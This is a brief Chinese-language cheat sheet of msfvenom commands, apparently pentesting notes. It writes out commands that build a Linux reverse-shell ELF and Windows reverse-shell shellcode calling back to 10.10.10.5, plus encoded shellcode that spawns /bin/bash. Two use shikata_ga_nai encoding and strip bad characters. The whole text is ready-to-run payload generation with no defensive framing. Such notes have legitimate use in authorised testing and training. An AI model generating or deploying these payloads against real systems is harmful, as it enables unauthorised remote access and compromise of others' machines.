# Msfvenom 实战语句

- Msf 生成反弹 shell

```
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
```

- 生成二进制脚本

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c
```

```
sudo msfvenom -p linux/x86/exec CMD="/bin/bash" -b "\x00" -e x86/shikata_ga_nai -f c
```
